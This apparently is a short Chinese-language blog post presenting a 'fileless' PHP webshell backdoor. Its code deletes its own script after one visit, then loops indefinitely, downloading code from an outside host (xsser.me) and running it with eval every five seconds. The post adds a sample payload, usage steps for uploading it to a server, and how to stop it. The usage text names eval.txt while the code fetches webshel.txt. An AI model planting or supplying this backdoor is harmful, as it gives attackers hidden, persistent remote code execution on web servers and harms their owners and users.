---
layout: post
category: webshell
tags: webshell
title1: php无文件后门
keywords: php无文件后门
description: 将 webshel.php 传到服务器之后访问一次他会自删除。但，依然会在后台执行 webshell.txt 中的代码。
---

### webshell.php

    <?php
    unlink($_SERVER['SCRIPT_FILENAME']);
    ignore_user_abort(true);
    set_time_limit(0);

    $remote_file = 'http://xsser.me/webshel.txt';
    while($code = file_get_contents($remote_file)){
    @eval($code);
    sleep(5);
    };
    ?>
  
### webshell.txt

    file_put_contents('1.txt','hello world '.time());

### 使用方式

将 webshel.php 传到服务器之后访问一次他会自删除。但，依然会在后台执行 eval.txt 中的代码

### 停止执行

删除或清空 webshel.txt。

### 缺点

服务器或WEB容器一重启后门就没了。